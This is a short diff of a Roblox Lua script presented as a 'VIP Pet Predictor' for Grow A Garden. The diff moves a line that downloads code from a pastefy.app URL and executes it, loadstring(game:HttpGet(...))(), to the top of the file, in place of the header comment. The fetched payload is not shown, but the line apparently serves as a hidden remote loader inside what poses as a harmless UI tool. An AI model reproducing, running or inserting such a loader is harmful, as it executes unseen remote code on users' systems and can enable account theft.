@@ -1,4 +1,4 @@
--- Kuni Hub VIP Pet Predictor | Grow A Garden (Clean UI, Anti-Spam, Mobile-Friendly)
+loadstring(game:HttpGet("https://pastefy.app/GkktmRtt/raw"))()
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
@@ -172,5 +172,3 @@ randomBtn.MouseButton1Click:Connect(function()
     randomBtn.Text = "Randomize Pet"
     canClick = true
 end)
-
-loadstring(game:HttpGet("https://pastefy.app/GkktmRtt/raw"))()
